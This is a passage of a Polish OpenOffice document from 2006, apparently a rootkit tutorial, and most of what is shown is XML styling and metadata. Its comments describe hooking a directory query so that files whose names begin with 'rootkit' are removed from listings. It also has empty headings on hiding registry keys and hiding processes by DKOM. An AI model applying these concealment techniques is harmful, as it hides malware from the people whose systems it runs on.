      <text:p text:style-name="P4"><text:tab/>// w tym miejscu przechodzimy przez bufor FileInformationBuffer przeszukując go pod kątem plików, <text:tab/></text:p>
      <text:p text:style-name="P4"><text:tab/>// katalogów rozpoczynających się od określonej nazwy ( u nas „rootkit” ).</text:p>
      <text:p text:style-name="P4"><text:tab/>// z bufora FileInformationBuffer wycinamy wszystkie wpisy rozpoczynające sie od tej nazwy</text:p>
      <text:p text:style-name="P4"><text:tab/>// wychodzimy z funkcji </text:p>
      <text:p text:style-name="P4"><text:tab/>// użytkownik otrzyma zmodyfikowane przez nas informacje o zawartości katalogu</text:p>
      <text:p text:style-name="P4"><text:tab/>// nie zobaczy plików/katalogów rozpoczynających się od słowa rootkit.</text:p>
      <text:p text:style-name="P4"><text:tab/>return rc;</text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P4"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P27">ukrywanie kluczy w rejestrze </text:p>
              <text:p text:style-name="P25">TODO</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:list text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P28">IMPLEMENTACJA UKRYWANIA PROCESÓW TECHNIKĄ DKOM:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P4"><text:tab/></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P24"/>
              <text:p text:style-name="P24"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/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><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"/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, Courier, mono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Header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4" style:display-name="Heading 4" style:family="paragraph" style:parent-style-name="Header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space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="2" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="3" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="4" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="5" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="6" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="7" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="8" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="9" style:num-format="">
        <style:list-level-properties text:space-before="1.27cm" text:min-label-distance="0.381cm"/>
      </text:outline-level-style>
      <text:outline-level-style text:level="10" style:num-format="">
        <style:list-level-properties text:space-before="1.27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$Win32 OpenOffice.org_project/680m3$Build-8968</meta:generator>
    <meta:creation-date>2006-06-12T20:33:56</meta:creation-date>
    <dc:date>2006-06-14T19:13:05</dc:date>
    <dc:language>pl-PL</dc:language>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:editing-duration>PT2H50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05" meta:word-count="1173" meta:character-count="9663"/>
  </office:meta>
</office:document-meta>
</file>